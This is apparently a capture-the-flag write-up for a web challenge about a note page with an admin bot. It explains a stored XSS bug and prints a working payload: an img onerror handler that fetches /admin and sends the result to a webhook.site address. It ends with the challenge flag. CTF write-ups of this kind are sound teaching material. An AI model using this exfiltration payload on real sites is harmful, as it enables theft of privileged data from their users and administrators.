## Question
Just a Mavs fan trying to figure out what Nico Harrison cooking up for my team nowadays...

## Solution
Here we've given a site which looks like this.
![image](https://github.com/user-attachments/assets/78d7f66d-e6dd-443e-95b9-e4cd3eb8949c)

And an admin bot to make it visit the note.
![image](https://github.com/user-attachments/assets/d2c687ee-5b20-4cc1-8d25-ac9de02a3c33)


This is classic XSS, as when you write `<h1>Hello</h1>` in the note it comes out like this.
![image](https://github.com/user-attachments/assets/743d11af-f771-407c-ae78-2cdd144b48db)

And looking at the source code, this was our objective.
```python
app.get('/admin', (req, res) => {
    if (!req.cookies.secret || req.cookies.secret !== ADMIN_SECRET) {
        return res.redirect("/");
    }
    return res.json({ trade_plan: FLAG });
});
```

So we have to craft a payload.\
Using a webhook, we write the command `<img src="x" onerror="fetch('/admin').then(r => r.text()).then(d => new Image().src='https://webhook.site/<some webhook>?flag='+encodeURIComponent(d))">` into the note area, and make the admin view it, we get the flag.
![Screenshot (12)](https://github.com/user-attachments/assets/a06c1300-4119-4f75-8195-7e495f9ec983)

flag: `lactf{m4yb3_w3_sh0u1d_tr4d3_1uk4_f0r_4d}`

